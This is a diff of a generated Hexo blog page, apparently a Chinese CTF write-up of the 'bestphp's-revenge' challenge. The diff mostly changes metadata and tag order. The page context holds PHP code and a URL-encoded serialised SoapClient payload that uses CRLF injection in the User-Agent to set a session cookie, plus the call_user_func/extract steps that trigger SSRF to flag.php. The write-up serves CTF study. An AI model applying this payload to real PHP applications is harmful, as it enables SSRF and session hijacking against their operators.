@@ -6,34 +6,17 @@
   <meta name="keywords" content=" CRLF , SoapClient类进行SSRF , call_user_func , session反序列化漏洞 ">
   <meta name="description" content="bestphp&#39;s-revenge | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
-<meta property="og:type" content="article">
-<meta property="og:title" content="docker学习">
-<meta property="og:url" content="https://mixbp.github.io/2026/09/14/docker%E5%AD%A6%E4%B9%A0/index.html">
+<meta name="description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="https://mixbp.github.io/about/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
+<meta property="og:description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-8.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-9.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-10.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-11.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-12.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-13.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-14.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-15.png">
-<meta property="article:published_time" content="2026-09-14T04:28:32.000Z">
-<meta property="article:modified_time" content="2026-09-18T11:22:32.136Z">
+<meta property="article:published_time" content="2026-11-16T09:30:00.000Z">
+<meta property="article:modified_time" content="2026-11-16T09:08:41.064Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="docker">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
 
 
 <link rel="icon" href="/img/favicon.png">
@@ -58,7 +41,8 @@
 
 <script src="/js/iconfont.js?v=1.1.0" ></script>
 
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MIXBP" type="application/atom+xml">
+</head>
 <div style="display: none">
   <input class="theme_disqus_on" value="false">
   <input class="theme_preload_comment" value="">
@@ -2215,7 +2199,7 @@
         
         <a  class="全部文章 java安全学习 "
            href="/2026/05/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/"
-           data-tag="java反序列化,JNDI,RMI"
+           data-tag="JNDI,RMI,java反序列化"
            data-author="" >
             <span class="post-title" title="java反序列化进阶">java反序列化进阶</span>
             <span class="post-date" title="2026-05-07 01:23:24">2026/05/07</span>
@@ -2737,7 +2721,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/05/22/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
-           data-tag="ssti,RCE,ssrf,sql"
+           data-tag="ssti,ssrf,RCE,sql"
            data-author="" >
             <span class="post-title" title="“轩辕杯”云盾砺剑CTF挑战赛复现">“轩辕杯”云盾砺剑CTF挑战赛复现</span>
             <span class="post-date" title="2025-05-22 23:37:59">2025/05/22</span>
@@ -2800,7 +2784,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/20/watevrCTF-2019-PickleStore/"
-           data-tag="反弹shell,python反序列化,外带数据,pickle反序列化"
+           data-tag="python反序列化,反弹shell,外带数据,pickle反序列化"
            data-author="" >
             <span class="post-title" title="watevrCTF-2019-PickleStore">watevrCTF-2019-PickleStore</span>
             <span class="post-date" title="2025-05-20 16:38:08">2025/05/20</span>
@@ -2872,7 +2856,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/11/SWPU2019-Web4/"
-           data-tag="代码审计,堆叠注入,时间盲注,16进制加SQL预处理绕过,PDO"
+           data-tag="代码审计,堆叠注入,16进制加SQL预处理绕过,时间盲注,PDO"
            data-author="" >
             <span class="post-title" title="SWPU2019-Web4">SWPU2019-Web4</span>
             <span class="post-date" title="2025-05-11 21:25:26">2025/05/11</span>
@@ -3169,7 +3153,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/04/15/BJDCTF2020-EzPHP/"
-           data-tag="代码审计,php特性,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
+           data-tag="php特性,代码审计,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
             <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
@@ -3187,7 +3171,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="sql注入,RCE,upload,明文攻击,CVE,目录穿越,内存马,时间盲注,压缩文件修复,时间帧隐写,docker"
+           data-tag="sql注入,upload,RCE,明文攻击,时间盲注,CVE,目录穿越,内存马,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -3376,7 +3360,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/03/30/BJDCTF2020-EasySearch1/"
-           data-tag="swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
+           data-tag="代码审计,swp泄露,md5碰撞,Apache SSI 远程命令执行漏洞"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
             <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
@@ -3991,12 +3975,13 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2025-05-11 14:45:30'>2025-05-05 21:10</time>
+            发布时间 : <time class="date" title='最后更新: 2026-11-16 17:09:26'>2025-05-05 21:10</time>
         
     </div>
     <div class="article-meta">
         
         <span>字数:1.8k</span>
+        <span>预计阅读 8 分钟</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -4044,16 +4029,16 @@
       
         <h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s-revenge"></a>bestphp’s-revenge</h1><p>参考博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/14335370.html">https://www.cnblogs.com/NPFS/p/14335370.html</a></p>
 <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="一-SoapClient"><a href="#一-SoapClient" class="headerlink" title="一. SoapClient"></a>一. SoapClient</h2><p><strong>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</strong><br><strong>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</strong></p>
-<p><img src="/../image/bestphp's-revenge-1.png"></p>
+<p><img loading="lazy" src="/../image/bestphp's-revenge-1.png"></p>
 <p>第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
 <p>用法实例：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(location<span class="hljs-string">&#x27;=&gt;&#x27;</span>http:<span class="hljs-comment">//example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure>
 
 <p>可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
-<p><img src="/../image/bestphp's-revenge-2.png"></p>
+<p><img loading="lazy" src="/../image/bestphp's-revenge-2.png"></p>
 <hr>
 <h2 id="二-CRLF-Injection漏洞"><a href="#二-CRLF-Injection漏洞" class="headerlink" title="二. CRLF Injection漏洞"></a>二. CRLF Injection漏洞</h2><p><strong>首先要对HTTPheaders 和 HTTPbody 要有一些基本的了解，如图，它们之前用空行区分</strong></p>
-<p><img src="/../image/bestphp's-revenge-3.png"></p>
+<p><img loading="lazy" src="/../image/bestphp's-revenge-3.png"></p>
 <p><strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br> <strong>简单来说</strong><br> <strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://localhost:2333&quot;</span>;<br><span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;location&quot;</span> =&gt; <span class="hljs-variable">$target</span>,<br>    <span class="hljs-string">&quot;user_agent&quot;</span> =&gt; <span class="hljs-string">&quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;</span>,<br>    <span class="hljs-string">&quot;uri&quot;</span> =&gt; <span class="hljs-string">&quot;demo&quot;</span><br>);<br><span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-variable">$options</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$attack</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>)-&gt;<span class="hljs-title function_ invoke__">ff</span>(); <span class="hljs-comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -4130,14 +4115,14 @@
 <p>执行脚本得到</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">|O<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>SoapClient<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>uri<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">17</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>location<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">25</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-variable">%2</span>Fflag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>_user_agent<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">31</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>npfs<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>ACookie<span class="hljs-variable">%3</span>APHPSESSID<span class="hljs-variable">%3</span>D<span class="hljs-number">123456</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>_soap_version<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/bestphp's-revenge-4.png"></p>
+<p><img loading="lazy" src="/../image/bestphp's-revenge-4.png"></p>
 <p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
 <p>传值f&#x3D;extract&amp;name&#x3D;SoapClient      POST:b&#x3D;call_user_func. 这样  call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap  请求进行 SSRF 。</p>
-<p><img src="/../image/bestphp's-revenge-5.png"></p>
+<p><img loading="lazy" src="/../image/bestphp's-revenge-5.png"></p>
 <p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
-<p><img src="/../image/bestphp's-revenge-6.png"></p>
+<p><img loading="lazy" src="/../image/bestphp's-revenge-6.png"></p>
 <p>总的流程如下，图来源于网络<a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%BA%8C">PHP反序列化入门之session反序列化</a></p>
-<p><img src="/../image/bestphp's-revenge-7.png"></p>
+<p><img loading="lazy" src="/../image/bestphp's-revenge-7.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
